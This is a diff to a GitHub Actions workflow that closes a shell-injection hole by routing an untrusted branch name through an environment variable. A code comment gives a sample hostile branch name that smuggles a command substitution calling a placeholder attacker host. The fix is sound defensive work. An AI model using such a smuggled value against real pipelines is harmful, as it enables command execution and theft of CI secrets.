@@ -89,8 +89,13 @@ jobs:
       - name: Extract info from branch
         if: steps.check.outputs.should_run == 'true'
         id: extract
+        env:
+          # Route the (still-untrusted) branch name through env: rather than
+          # `${{ … }}` interpolation in the run body — otherwise a branch like
+          # `implementation/foo/$(curl evil.com)` would be re-interpreted as
+          # a shell command substitution at the assignment site.
+          BRANCH: ${{ steps.check.outputs.branch }}
         run: |
-          BRANCH="${{ steps.check.outputs.branch }}"
           # Format: implementation/{specification-id}/{library}
           SPEC_ID=$(echo "$BRANCH" | cut -d'/' -f2)
           LIBRARY=$(echo "$BRANCH" | cut -d'/' -f3)
